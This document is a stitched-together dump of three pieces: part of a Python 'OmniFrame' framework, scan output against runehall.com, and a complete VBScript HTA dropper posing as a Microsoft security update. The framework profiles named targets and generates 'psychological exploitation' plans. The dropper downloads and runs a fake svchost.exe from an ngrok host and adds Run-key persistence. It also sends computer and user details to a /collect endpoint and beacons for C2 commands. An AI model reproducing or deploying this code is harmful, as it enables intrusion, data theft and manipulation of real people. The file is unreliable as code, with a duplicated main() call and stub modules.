                    "social_media_profiles": ["twitter.com/user1", "facebook.com/user1"],
                    "email_addresses": ["user@example.com"],
                    "associated_domains": ["example.com", "related-site.com"],
                    "behavioral_patterns": ["frequent_poster", "tech_enthusiast"]
                }
        
        return OSINTFusionModule()
    
    def load_aegis_osint(self):
        """Load AEGIS OSINT module"""
        class AEGISOSINTModule:
            def __init__(self):
                self.name = "AEGIS OSINT"
                self.version = "1.0.0"
                self.capabilities = [
                    "subdomain_enumeration",
                    "port_scanning",
                    "cloud_infrastructure_discovery",
                    "vulnerability_assessment"
                ]
            
            def enumerate_subdomains(self, domain: str) -> Dict:
                """Enumerate subdomains"""
                return {
                    "domain": domain,
                    "subdomains": ["www.example.com", "mail.example.com", "api.example.com"],
                    "discovery_methods": ["certificate_transparency", "dns_bruteforce"]
                }
        
        return AEGISOSINTModule()
    
    def load_visualization(self):
        """Load visualization module"""
        class VisualizationModule:
            def __init__(self):
                self.name = "Visualization"
                self.version = "1.0.0"
                self.capabilities = [
                    "network_graphing",
                    "data_mapping",
                    "relationship_analysis",
                    "interactive_dashboards"
                ]
            
            def create_network_graph(self, data: Dict) -> str:
                """Create network visualization"""
                return "Network graph generated successfully"
        
        return VisualizationModule()
    
    def load_psychological_profiler(self):
        """Load psychological profiler"""
        return PsychologicalProfiler(self.config)
    
    def execute_workflow(self, target: str, workflow_type: str = "comprehensive") -> Dict:
        """Execute a predefined workflow"""
        results = {
            "target": target,
            "workflow_type": workflow_type,
            "start_time": datetime.now().isoformat(),
            "modules_executed": [],
            "results": {}
        }
        
        if workflow_type == "comprehensive":
            # OSINT gathering
            if "osint_fusion" in self.modules:
                osint_results = self.modules["osint_fusion"].gather_intelligence(target)
                results["results"]["osint"] = osint_results
                results["modules_executed"].append("osint_fusion")
            
            # Psychological analysis
            if "psychological_profiler" in self.modules and "osint" in results["results"]:
                psych_analysis = self.modules["psychological_profiler"].analyze_target_behavior(
                    results["results"]["osint"]
                )
                results["results"]["psychological_analysis"] = psych_analysis
                results["modules_executed"].append("psychological_profiler")
            
            # Infrastructure scanning
            if "aegis_osint" in self.modules:
                subdomains = self.modules["aegis_osint"].enumerate_subdomains(target)
                results["results"]["infrastructure"] = subdomains
                results["modules_executed"].append("aegis_osint")
            
            # Vulnerability assessment
            if "damienz_domain" in self.modules and "infrastructure" in results["results"]:
                for subdomain in results["results"]["infrastructure"].get("subdomains", []):
                    scan_results = self.modules["damienz_domain"].scan_target(subdomain)
                    if "vulnerability_scans" not in results["results"]:
                        results["results"]["vulnerability_scans"] = []
                    results["results"]["vulnerability_scans"].append(scan_results)
                results["modules_executed"].append("damienz_domain")
        
        results["end_time"] = datetime.now().isoformat()
        results["duration"] = (
            datetime.fromisoformat(results["end_time"]) - 
            datetime.fromisoformat(results["start_time"])
        ).total_seconds()
        
        return results

class OmniFrameCore:
    """Core framework class integrating all components"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.module_manager = ModuleManager(self.config)
        self.psychological_profiler = PsychologicalProfiler(self.config)
        
        # Initialize data stores
        self.target_data = {}
        self.operation_history = []
        self.reports = {}
    
    def add_target(self, target_identifier: str, target_data: Dict = None):
        """Add a new target to the framework"""
        if target_data is None:
            target_data = {
                "identifier": target_identifier,
                "added": datetime.now().isoformat(),
                "last_updated": datetime.now().isoformat(),
                "data_sources": [],
                "vulnerabilities": [],
                "psychological_profile": {},
                "exploitation_plan": {}
            }
        
        self.target_data[target_identifier] = target_data
        self.save_target_data(target_identifier)
        
        return target_identifier
    
    def gather_intelligence(self, target_identifier: str, intensity: str = "normal") -> Dict:
        """Gather intelligence on a target"""
        if target_identifier not in self.target_data:
            self.add_target(target_identifier)
        
        # Execute intelligence gathering workflow
        results = self.module_manager.execute_workflow(target_identifier, "comprehensive")
        
        # Update target data with new intelligence
        self.target_data[target_identifier].update({
            "last_updated": datetime.now().isoformat(),
            "data_sources": results["modules_executed"],
            "intelligence_data": results["results"]
        })
        
        # Perform psychological analysis if OSINT data is available
        if "osint" in results["results"]:
            psych_analysis = self.psychological_profiler.analyze_target_behavior(
                results["results"]["osint"]
            )
            self.target_data[target_identifier]["psychological_profile"] = psych_analysis
            
            # Generate exploitation plan
            exploitation_plan = self.psychological_profiler.generate_exploitation_plan(psych_analysis)
            self.target_data[target_identifier]["exploitation_plan"] = exploitation_plan
        
        self.save_target_data(target_identifier)
        self.operation_history.append({
            "type": "intelligence_gathering",
            "target": target_identifier,
            "time": datetime.now().isoformat(),
            "results": "success" if results else "failed"
        })
        
        return results
    
    def execute_exploitation(self, target_identifier: str, vulnerability: str = None) -> Dict:
        """Execute exploitation against a target"""
        if target_identifier not in self.target_data:
            return {"error": "Target not found"}
        
        target_data = self.target_data[target_identifier]
        
        # If no specific vulnerability provided, use the first one found
        if vulnerability is None and "vulnerability_scans" in target_data.get("intelligence_data", {}):
            for scan in target_data["intelligence_data"]["vulnerability_scans"]:
                if scan.get("vulnerabilities"):
                    vulnerability = scan["vulnerabilities"][0]["type"]
                    break
        
        if vulnerability is None:
            return {"error": "No vulnerabilities found to exploit"}
        
        # Execute exploitation
        if "damienz_domain" in self.module_manager.modules:
            exploit_result = self.module_manager.modules["damienz_domain"].exploit_vulnerability(
                target_identifier, vulnerability
            )
            
            # Update target data
            if "exploitation_attempts" not in self.target_data[target_identifier]:
                self.target_data[target_identifier]["exploitation_attempts"] = []
            
            self.target_data[target_identifier]["exploitation_attempts"].append({
                "vulnerability": vulnerability,
                "time": datetime.now().isoformat(),
                "result": exploit_result
            })
            
            self.save_target_data(target_identifier)
            self.operation_history.append({
                "type": "exploitation",
                "target": target_identifier,
                "vulnerability": vulnerability,
                "time": datetime.now().isoformat(),
                "result": "success" if exploit_result.get("success") else "failed"
            })
            
            return exploit_result
        
        return {"error": "Exploitation module not available"}
    
    def generate_report(self, target_identifier: str, report_type: str = "comprehensive") -> Dict:
        """Generate a report for a target"""
        if target_identifier not in self.target_data:
            return {"error": "Target not found"}
        
        target_data = self.target_data[target_identifier]
        report_id = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        report = {
            "id": report_id,
            "target": target_identifier,
            "generated": datetime.now().isoformat(),
            "type": report_type,
            "executive_summary": self.generate_executive_summary(target_data),
            "detailed_findings": target_data.get("intelligence_data", {}),
            "psychological_profile": target_data.get("psychological_profile", {}),
            "exploitation_plan": target_data.get("exploitation_plan", {}),
            "recommendations": self.generate_recommendations(target_data)
        }
        
        # Save report
        self.reports[report_id] = report
        self.save_report(report_id)
        
        return report
    
    def generate_executive_summary(self, target_data: Dict) -> Dict:
        """Generate an executive summary"""
        vulnerabilities = []
        if "intelligence_data" in target_data and "vulnerability_scans" in target_data["intelligence_data"]:
            for scan in target_data["intelligence_data"]["vulnerability_scans"]:
                vulnerabilities.extend(scan.get("vulnerabilities", []))
        
        return {
            "vulnerability_count": len(vulnerabilities),
            "critical_vulnerabilities": len([v for v in vulnerabilities if v.get("severity") == "critical"]),
            "psychological_risk": target_data.get("psychological_profile", {}).get("risk_assessment", "unknown"),
            "exploitation_success_probability": target_data.get("exploitation_plan", {}).get("expected_success_rate", 0)
        }
    
    def generate_recommendations(self, target_data: Dict) -> List[str]:
        """Generate recommendations based on findings"""
        recommendations = []
        
        # Add vulnerability-based recommendations
        if "intelligence_data" in target_data and "vulnerability_scans" in target_data["intelligence_data"]:
            for scan in target_data["intelligence_data"]["vulnerability_scans"]:
                for vuln in scan.get("vulnerabilities", []):
                    recommendations.append(
                        f"Address {vuln.get('type', 'unknown')} vulnerability on {scan.get('target', 'unknown')}"
                    )
        
        # Add psychological-based recommendations
        psych_profile = target_data.get("psychological_profile", {})
        if psych_profile and "recommended_techniques" in psych_profile:
            for technique in psych_profile["recommended_techniques"]:
                recommendations.append(
                    f"Employ {technique.get('technique', 'unknown')} technique for psychological exploitation"
                )
        
        return recommendations
    
    def save_target_data(self, target_identifier: str):
        """Save target data to secure storage"""
        target_file = self.config.config_dir / "data" / f"{target_identifier}.encrypted"
        try:
            data_json = json.dumps(self.target_data[target_identifier], indent=2)
            encrypted_data = self.config.encrypt_data(data_json)
            with open(target_file, 'wb') as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Error saving target data: {e}")
            return False
    
    def load_target_data(self, target_identifier: str) -> bool:
        """Load target data from secure storage"""
        target_file = self.config.config_dir / "data" / f"{target_identifier}.encrypted"
        if target_file.exists():
            try:
                with open(target_file, 'rb') as f:
                    encrypted_data = f.read()
                decrypted_data = self.config.decrypt_data(encrypted_data)
                self.target_data[target_identifier] = json.loads(decrypted_data)
                return True
            except Exception as e:
                logger.error(f"Error loading target data: {e}")
                return False
        return False
    
    def save_report(self, report_id: str):
        """Save report to secure storage"""
        report_file = self.config.config_dir / "reports" / f"{report_id}.encrypted"
        try:
            report_json = json.dumps(self.reports[report_id], indent=2)
            encrypted_data = self.config.encrypt_data(report_json)
            with open(report_file, 'wb') as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Error saving report: {e}")
            return False

def main():
    """Main entry point for the OmniFrame framework"""
    if not DEPENDENCIES_AVAILABLE:
        print("Error: Required dependencies are not installed.")
        print("Please install dependencies with: pip install requests numpy pandas beautifulsoup4 questionary aiodns python-nmap selenium scikit-learn networkx matplotlib")
        return
    
    print(r"""
     ___    ___   ___  _     ___   ___    ___   ___   ___   ___ 
    / _ \  / __| / __|| |   | _ \ | _ \  / _ \ | _ \ | __| | _ \
   | (_) || (__ | (__ | |__ |  _/ |   / | (_) ||   / | _|  |  _/
    \___/  \___| \___||____||_|   |_|_\  \___/ |_|_\ |___| |_|  
                                                                
    Enterprise-Grade OSINT & Penetration Testing Framework
    """)
    
    # Initialize the framework
    framework = OmniFrameCore()
    
    # Example usage
    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Starting comprehensive analysis of {target}...")
        
        # Gather intelligence
        results = framework.gather_intelligence(target)
        print(f"[+] Intelligence gathering completed")
        
        # Generate report
        report = framework.generate_report(target)
        print(f"[+] Report generated: {report['id']}")
        
        # Show executive summary
        print("\nExecutive Summary:")
        print(f"Vulnerabilities found: {report['executive_summary']['vulnerability_count']}")
        print(f"Critical vulnerabilities: {report['executive_summary']['critical_vulnerabilities']}")
        print(f"Psychological risk: {report['executive_summary']['psychological_risk']}")
        print(f"Exploitation success probability: {report['executive_summary']['exploitation_success_probability']:.0%}")
        
        # Save report to file
        report_file = f"{target}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Full report saved to: {report_file}")
    else:
        print("Usage: python omniframe.py <target>")
        print("Example: python omniframe.py example.com")

if __name__ == "__main__":
    main()    main()





[*] Scanning runehall.com

[*] Directory Bruteforce:
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(

[*] Header Analysis:
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
{
  "Date": "Tue, 11 Nov 2025 22:03:33 GMT",
  "Content-Type": "text/html; charset=UTF-8",
  "Transfer-Encoding": "chunked",
  "Connection": "close",
  "accept-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
  "cf-mitigated": "challenge",
  "critical-ch": "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Full-Version-List, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA",
  "cross-origin-embedder-policy": "require-corp",
  "cross-origin-opener-policy": "same-origin",
  "cross-origin-resource-policy": "same-origin",
  "origin-agent-cluster": "?1",
  "permissions-policy": "accelerometer=(),browsing-topics=(),camera=(),clipboard-read=(),clipboard-write=(),geolocation=(),gyroscope=(),hid=(),interest-cohort=(),magnetometer=(),microphone=(),payment=(),publickey-credentials-get=(),screen-wake-lock=(),serial=(),sync-xhr=(),usb=()",
  "referrer-policy": "same-origin",
  "server-timing": "chlray;desc=\"99d114900a3567b1\", cfL4;desc=\"?proto=TCP&rtt=45323&min_rtt=44576&rtt_var=18211&sent=5&recv=8&lost=0&retrans=0&sent_bytes=3929&recv_bytes=1940&delivery_rate=80700&cwnd=104&unsent_bytes=0&cid=8f5a2cc561a40dbc&ts=88&x=0\"",
  "x-content-type-options": "nosniff",
  "x-frame-options": "SAMEORIGIN",
  "Cache-Control": "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
  "Expires": "Thu, 01 Jan 1970 00:00:01 GMT",
  "Report-To": "{\"endpoints\":[{\"url\":\"https:\\/\\/a.nel.cloudflare.com\\/report\\/v4?s=2vTleJk%2BiXDgukkOVRd5iwN%2FLKYFG3ZyYOoR2BPJBdLTes%2B4amwd0UHsbia0CIZ51M01tOr5In7d1Hpt2w93WJGvjzR%2FmUT2OAj2%2F%2FT4cVrRuvobJ7ITQRwAx19FgM7YMEwzJGsn%2B9AcoA%3D%3D\"}],\"group\":\"cf-nel\",\"max_age\":604800}",
  "NEL": "{\"success_fraction\":0,\"report_to\":\"cf-nel\",\"max_age\":604800}",
  "Vary": "Accept-Encoding",
  "Server": "cloudflare",
  "CF-RAY": "99d114900a3567b1-MIA",
  "Content-Encoding": "gzip",
  "alt-svc": "h3=\":443\"; ma=86400"
}

[*] Technology Detection:
/home/damien/lib/python3.13/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'runehall.com'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
{
  "server": "cloudflare"
}











<html>
<head>
<HTA:APPLICATION 
    ID="VenomPayload"
    APPLICATIONNAME="Security Update"
    WINDOWSTATE="minimize"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
    CAPTION="no"
    SYSMENU="no"
    SCROLL="no"
    INNERBORDER="no"
    CONTEXTMENU="no"
    BORDER="none"
    BORDERSTYLE="none"
    SELECTION="no">
    
<script language="VBScript">
    ' VENOM HTA Payload v4.0 - FULLY OPERATIONAL
    Sub Window_OnLoad
        On Error Resume Next
        
        ' Phase 1: Initial Execution
        ExecutePhase1
        
        ' Phase 2: Persistence
        ExecutePhase2
        
        ' Phase 3: Intelligence Gathering  
        ExecutePhase3
        
        ' Phase 4: C2 Communication
        ExecutePhase4
        
        ' Close HTA window
        window.close
    End Sub
    
    Sub ExecutePhase1
        ' Disable security features
        Set oShell = CreateObject("Wscript.Shell")
        oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\2500", 3, "REG_DWORD"
        
        ' Download and execute stage 2
        strURL = "http://lecia-merciful-masako.ngrok-free.dev/update"
        strPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
        
        Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")
        oXMLHTTP.open "GET", strURL, False
        oXMLHTTP.send
        
        If oXMLHTTP.Status = 200 Then
            Set oADOStream = CreateObject("ADODB.Stream")
            oADOStream.Open
            oADOStream.Type = 1
            oADOStream.Write oXMLHTTP.responseBody
            oADOStream.Position = 0
            oADOStream.SaveToFile strPath
            oADOStream.Close
            
            oShell.Run "cmd /c start /min powershell -ExecutionPolicy Bypass -File """ & strPath & """", 0, False
        End If
    End Sub
    
    Sub ExecutePhase2
        ' Establish persistence via registry
        Set oShell = CreateObject("Wscript.Shell")
        strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate"
        strPayloadPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\svchost.exe"
        
        oShell.RegWrite strRegPath, "powershell -ExecutionPolicy Bypass -File """ & strPayloadPath & """", "REG_SZ"
    End Sub
    
    Sub ExecutePhase3
        ' Gather comprehensive system intelligence
        Set oShell = CreateObject("Wscript.Shell")
        Set oWMI = GetObject("winmgmts:")
        
        ' Collect system info
        strComputerName = oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
        strUserName = oShell.ExpandEnvironmentStrings("%USERNAME%")
        strDomain = oShell.ExpandEnvironmentStrings("%USERDOMAIN%")
        
        ' Get OS version
        For Each os In oWMI.ExecQuery("Select * from Win32_OperatingSystem")
            strOS = os.Caption
            strArch = os.OSArchitecture
        Next
        
        ' Prepare intelligence data
        strData = "{""computer_name"":""0"",""username"":""1"",""domain"":""2"",""os"":""3"",""architecture"":""4"",""type"":""system_info""}"
        strData = Replace(strData, "0", strComputerName)
        strData = Replace(strData, "1", strUserName) 
        strData = Replace(strData, "2", strDomain)
        strData = Replace(strData, "3", strOS)
        strData = Replace(strData, "4", strArch)
        
        ' Send to C2
        Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")
        oXMLHTTP.open "POST", "http://lecia-merciful-masako.ngrok-free.dev/collect", False
        oXMLHTTP.setRequestHeader "Content-Type", "application/json"
        oXMLHTTP.send strData
    End Sub
    
    Sub ExecutePhase4
        ' Establish C2 beacon for persistence
        Set oShell = CreateObject("Wscript.Shell")
        
        Do While True
            Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP.3.0")
            oXMLHTTP.open "GET", "http://lecia-merciful-masako.ngrok-free.dev/beacon", False
            
            On Error Resume Next
            oXMLHTTP.send
            If oXMLHTTP.Status = 200 Then
                strResponse = oXMLHTTP.responseText
                ' Process C2 commands here
            End If
            On Error Goto 0
            
            ' Sleep before next beacon (5 minutes)
            WScript.Sleep 300000
        Loop
    End Sub
</script>
</head>
<body>
<!-- Decoy content -->
<div style="display:none;">
    <h1>Microsoft Security Update</h1>
    <p>Installing latest security patches...</p>
</div>
</body>
</html>
        
